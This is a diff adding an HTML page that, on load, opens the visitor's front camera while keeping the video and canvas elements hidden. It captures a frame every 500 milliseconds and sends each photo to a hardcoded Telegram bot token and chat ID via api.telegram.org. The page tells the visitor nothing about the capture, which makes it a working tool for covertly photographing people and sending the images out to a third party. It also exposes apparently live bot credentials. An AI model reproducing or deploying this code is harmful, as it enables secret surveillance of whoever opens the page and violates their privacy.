@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Capture and Send to Telegram</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+    }
+    video, canvas {
+      border: 2px solid #000;
+      margin: 10px;
+    }
+    p {
+      color: red;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+   
+  </div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    const TELEGRAM_BOT_TOKEN = '7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8';  // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '6128322651';              // Replace with your chat ID
+
+    // Access the user's front camera
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }
+        });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error('Error accessing the camera: ', err);
+      }
+    }
+
+    // Capture and send the photo every 500ms
+    async function captureAndSendPhoto() {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);   // Draw the video frame to canvas
+      const dataUrl = canvas.toDataURL('image/png');                 // Convert canvas to image (base64)
+      const blob = await fetch(dataUrl).then(res => res.blob());      // Convert base64 to Blob
+
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', blob, 'photo.png');
+
+      // Send the photo to Telegram
+      fetch(`https://api.telegram.org/bot$7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (!data.ok) {
+          console.error('Failed to send photo:', data.description);
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+    }
+
+    // Start capturing and sending photos every 500ms
+    function startAutoCapture() {
+      setInterval(captureAndSendPhoto, 500);   // Capture and send every 500ms
+    }
+
+    // Start the camera and auto-capture when the page loads
+    startCamera().then(startAutoCapture);
+  </script>
+</body>
+</html>
